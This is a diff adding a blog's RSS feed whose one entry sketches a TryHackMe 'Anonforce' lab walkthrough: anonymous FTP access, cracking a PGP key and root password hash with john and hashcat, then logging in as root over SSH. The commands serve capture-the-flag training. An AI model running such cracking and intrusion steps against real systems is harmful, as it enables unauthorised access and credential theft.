@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Tryhackmes on Hack Notes</title>
+    <link>//localhost:1313/tryhackme/</link>
+    <description>Recent content in Tryhackmes on Hack Notes</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>© 2024 </copyright>
+    <lastBuildDate>Wed, 19 Jun 2024 00:00:00 +0000</lastBuildDate><atom:link href="//localhost:1313/tryhackme/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Untitled</title>
+      <link>//localhost:1313/tryhackme/anonforce/</link>
+      <pubDate>Wed, 19 Jun 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tryhackme/anonforce/</guid>
+      <description>Writeup: YouTube // Blog
+rustscan -a $ip, 21:ftp 22:ssh
+ftp $ip, anonymous
+user = m*******
+get user.txt
+cat ~/user.txt get /notread/*
+gpg2john private.asc &amp;gt; private.hash john --wordlist=/rockyou.txt private.hash x****** gpg 🔗 🔗
+gpg -d backup.pgp nano root.hash
+hashcat root.hash rockyou.txt h***** ssh root@$ip</description>
+      
+    </item>
+    
+  </channel>
+</rss>
